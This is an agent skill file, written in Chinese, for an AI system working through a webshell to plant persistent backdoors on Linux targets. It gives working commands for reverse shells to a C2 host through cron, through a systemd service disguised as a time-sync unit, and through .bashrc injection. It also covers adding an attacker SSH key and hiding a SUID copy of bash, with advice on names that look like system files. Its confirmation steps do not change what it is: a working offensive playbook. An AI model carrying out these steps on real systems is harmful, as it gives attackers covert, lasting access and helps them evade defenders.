---
name: persistence-linux
description: 在 Linux 目标上建立持久化后门，包括 cron 任务、systemd 服务、SSH authorized_keys、~/.bashrc 注入、SUID 后门等方式。当任务涉及 Linux 持久化、后门植入、维持访问、cron 后门时使用。执行前必须获得用户明确确认。
enabled: true
---

# Linux 持久化

当用户明确要求在 Linux 目标上建立持久化访问时，使用这个 skill。

**重要：执行前必须向用户明确说明将要进行的操作和影响，并等待确认。**

---

## 一、OPSEC 与环境约束

| 原则 | 说明 |
|---|---|
| 用户确认优先 | 所有写操作执行前必须获得用户明确确认 |
| 最小痕迹 | 只植入一种持久化方式，避免多重痕迹 |
| 伪装命名 | 文件名、服务名、cron 注释要像系统组件 |
| 记录清理路径 | 每次植入必须记录完整清理命令 |
| 验证生效 | 植入后必须验证持久化已生效 |

**WebShell 环境注意：**
- WebShell 用户（www-data/tomcat）可能没有 crontab 权限（`/etc/cron.allow` 限制）
- `~/.ssh` 目录可能不存在且 HOME 目录可能不可写
- 容器环境中 systemd 可能不可用（PID 1 不是 systemd）
- 部分精简容器无 `cron` 守护进程
- SELinux/AppArmor 可能阻止非标准路径执行

---

## 二、目标

在目标机器上建立至少一种持久化机制，确保即使 Webshell 被清理或服务重启后，仍可恢复访问。

---

## 三、工作流程

### 执行前：制定计划

在任何工具调用前，先输出：

1. **目标**：在目标 Linux 主机上建立持久化访问
2. **路径**：确认权限和环境 → 选择合适方式 → 向用户确认 → 执行植入 → 验证生效 → 记录清理路径
3. **终止条件**：至少一种持久化方式部署成功并验证，或所有方式均因权限不足失败时停止

如果已有侦察摘要，先读取 `privilegeProfile`（root 或普通用户）、`hostProfile`（OS 版本）、`containerProfile`（容器状态）。

### 第一步：环境确认

```bash
id && whoami
# 检查 cron 可用性
which crontab 2>/dev/null && crontab -l 2>/dev/null
# 检查 systemd 可用性
ps -p 1 -o comm= 2>/dev/null
# 检查 SSH 服务
ss -tlnp 2>/dev/null | grep ":22"
# 检查 HOME 目录可写性
test -w ~ && echo "HOME_WRITABLE" || echo "HOME_NOT_WRITABLE"
```

### 第二步：选择持久化方式

根据环境选择（向用户说明后等待确认）：

| 权限 | 环境 | 推荐方式 | 备选 |
|---|---|---|---|
| root | systemd 可用 | systemd 服务 | cron |
| root | 无 systemd | cron（root crontab） | SUID 后门 |
| 普通用户 | SSH 开启 | SSH authorized_keys | cron |
| 普通用户 | 无 SSH | cron | bashrc 注入 |
| 容器内 | 任意 | cron（如可用） | bashrc |

### 第三步：执行植入（用户确认后）

### 第四步：验证生效

### 第五步：记录清理路径并写入摘要

---

## 四、持久化方式

### 方式一：cron 后门（低权限可用）

**适用：** 任何有 crontab 权限的用户

**植入：**
```bash
# 添加 cron（替换 C2 地址和端口）
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<C2_HOST>/<C2_PORT> 0>&1'") | crontab -
```

**验证：**
```bash
crontab -l | grep -v "^#"
```

**清理：**
```bash
crontab -l | grep -v "<C2_HOST>" | crontab -
```

**注意：**
- 频率不要太高（建议 ≥5 分钟），避免日志刷屏
- 如果 `/etc/cron.allow` 存在且不含当前用户，crontab 不可用
- root 用户可直接写 `/etc/cron.d/` 下的文件（更隐蔽）

### 方式二：SSH authorized_keys（推荐，最稳定）

**适用：** 目标开启 SSH 服务，且可写 `~/.ssh/` 目录

**植入：**
```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "<ATTACKER_PUBLIC_KEY>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**验证：**
```bash
cat ~/.ssh/authorized_keys | tail -1
```

**清理：**
```bash
# 删除最后一行（或指定公钥行）
sed -i '/<KEY_FINGERPRINT>/d' ~/.ssh/authorized_keys
```

**注意：**
- 需要事先在攻击者机器生成密钥对（`ssh-keygen -t ed25519`）
- 如果 SSH 只监听内网，需通过代理访问
- 检查 `/etc/ssh/sshd_config` 中 `AuthorizedKeysFile` 是否为默认路径
- 检查是否禁用了密钥认证（`PubkeyAuthentication`）

### 方式三：systemd 服务（需要 root）

**适用：** 有 root 权限，目标使用 systemd

**植入：**
```bash
cat > /etc/systemd/system/network-sync.service << 'EOF'
[Unit]
Description=Network Time Synchronization Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<C2_HOST>/<C2_PORT> 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable network-sync.service
systemctl start network-sync.service
```

**验证：**
```bash
systemctl is-enabled network-sync.service
systemctl status network-sync.service
```

**清理：**
```bash
systemctl disable --now network-sync.service
rm /etc/systemd/system/network-sync.service
systemctl daemon-reload
```

**注意：**
- 服务名要像系统服务（`network-sync`、`system-monitor`）
- `RestartSec` 控制重连间隔，不要太短
- 容器内通常无 systemd，此方式不可用

### 方式四：~/.bashrc / ~/.profile 注入（低权限，交互式触发）

**适用：** 低权限用户，作为辅助手段

**植入：**
```bash
echo 'nohup bash -i >& /dev/tcp/<C2_HOST>/<C2_PORT> 0>&1 2>/dev/null &' >> ~/.bashrc
```

**验证：**
```bash
tail -1 ~/.bashrc
```

**清理：**
```bash
sed -i '/<C2_HOST>/d' ~/.bashrc
```

**局限性：** 只在用户手动登录交互式 Shell 时触发，不适合持续驻留。

### 方式五：SUID 后门（需要 root，隐蔽性高）

**适用：** 有 root 权限，留下可随时提权的入口

**植入：**
```bash
cp /bin/bash /usr/lib/.cache-update
chmod u+s /usr/lib/.cache-update
```

**使用（普通用户执行）：**
```bash
/usr/lib/.cache-update -p
```

**验证：**
```bash
ls -la /usr/lib/.cache-update | grep "^-..s"
```

**清理：**
```bash
rm /usr/lib/.cache-update
```

**注意：**
- 路径选择要隐蔽（`/usr/lib/`、`/var/cache/` 等系统目录）
- 文件名要像系统文件（`.cache-update`、`.libsync`）
- 部分系统挂载 `/tmp` 为 nosuid，不要放在 `/tmp`

---

## 五、工具优先级

| 优先级 | 工具 | 用途 |
|---|---|---|
| 1 | `CommandTools` | 环境确认、执行植入命令、验证 |
| 2 | `FileTools` | 创建 systemd 服务文件、读取验证 |

---

## 六、失败回退

| 场景 | 回退策略 |
|---|---|
| crontab 被 `/etc/cron.allow` 限制 | 尝试 SSH 公钥或 bashrc |
| `~/.ssh` 不可写 | 尝试 cron |
| 容器内无 systemd | 使用 cron 或 bashrc |
| 容器内无 cron | 使用 bashrc 或在应用启动脚本中注入 |
| SELinux 阻止执行 | 标注限制，建议用户评估是否调整 |
| SSH 未开启 | 使用 cron 或 systemd |
| 所有方式均失败 | 报告环境限制，建议用户评估其他方案 |

---

## 七、输出格式

```markdown
## Linux 持久化摘要

**当前权限**：{username}（{root/user}）
**选择方式**：{method_name}
**状态**：{已部署并验证 / 部署失败}

---

## 植入详情

| 项目 | 内容 |
|------|------|
| 方式 | {cron / ssh_key / systemd / bashrc / suid} |
| 位置 | {完整路径或 crontab 规则} |
| 触发条件 | {定时 / 开机 / 登录时 / 手动} |
| 连接方式 | {如何重新接入} |

## 清理命令

```bash
{完整清理命令}
```

## 验证结果

{验证输出}

## 下一步建议

1~2 条具体建议
```

### 建议示例

| 场景 | 建议 |
|---|---|
| 持久化成功 | 使用 recon-internal-network skill 探测内网 |
| 需要凭据 | 使用 hunt-credentials skill 收集凭据 |
| 权限不足 | 先使用 escalate-linux-privilege skill 提权 |

---

## 八、决策规则

| 场景 | 行为 |
|---|---|
| 执行前 | 必须向用户确认，说明写入内容和位置 |
| 多种方式可用 | 推荐 SSH 公钥（最稳定、最隐蔽、最易清理） |
| 无 root 权限 | 优先 cron 或 SSH 公钥 |
| 需要最高隐蔽性 + root | SUID 后门（无网络连接痕迹） |
| 命名规范 | 像系统组件，避免 `shell`、`backdoor` 等 |
| 植入数量 | 只植入一种，避免多重痕迹 |
| 植入后 | 必须验证生效并记录清理命令 |
| 容器环境 | 注意容器重启后文件可能丢失 |
| 所有植入信息 | 写入侦察摘要 |

---

## 九、结构化摘要写入

完成后必须：

1. `manage_recon_summary(action="append")` — 已部署的持久化方式、路径和验证结果
2. `manage_recon_summary(action="append")` — 机器可读字段

结构化 patch 示例：

```json
{
  "persistenceProfile": {
    "linux": {
      "methods": [
        {
          "type": "ssh_authorized_keys",
          "deployed": true,
          "path": "/home/www-data/.ssh/authorized_keys",
          "payload": "ed25519 public key",
          "trigger": "ssh login",
          "verified": true,
          "cleanup": "sed -i '/<fingerprint>/d' ~/.ssh/authorized_keys"
        }
      ],
      "cleanupNotes": "删除 authorized_keys 中对应公钥行即可清除"
    }
  }
}
```

---

## Skill 元数据

- riskLevel: `high`
- accessMode: `write_destructive`
- requiredTools: `CommandTools`, `FileTools`
- optionalTools: `ResourceTools`, `ScheduledTaskTools`, `ServiceManagerTools`, `PersistenceTools`
- produces: `persistenceProfile.linux`, `openQuestions`
- recommendedNextSkills: `recon-internal-network`, `hunt-credentials`
- forbiddenByDefault: 未经用户确认不得执行任何写入操作
